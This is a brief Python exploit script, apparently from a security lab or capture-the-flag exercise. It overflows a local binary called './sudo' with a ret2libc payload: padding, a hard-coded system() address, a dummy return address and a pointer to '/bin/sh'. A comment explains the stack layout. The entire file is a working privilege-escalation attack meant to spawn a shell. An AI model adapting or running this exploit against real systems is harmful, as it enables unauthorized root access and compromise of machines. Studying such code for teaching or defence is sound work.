import os, sys, struct


PATH_TO_SUDO = './sudo'


def get_arg():
	offset = 66
	system_address = 0xb7c5dda0
	bin_sh_address = 0xb7d7e82b
	# The 4 * 'a' between the system call and it's parameter ("bin/sh") is the 4 bytes of the return address from system.
	return 'a'*offset + struct.pack('<I', system_address) + 'a'*4 + struct.pack('<I', bin_sh_address)


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
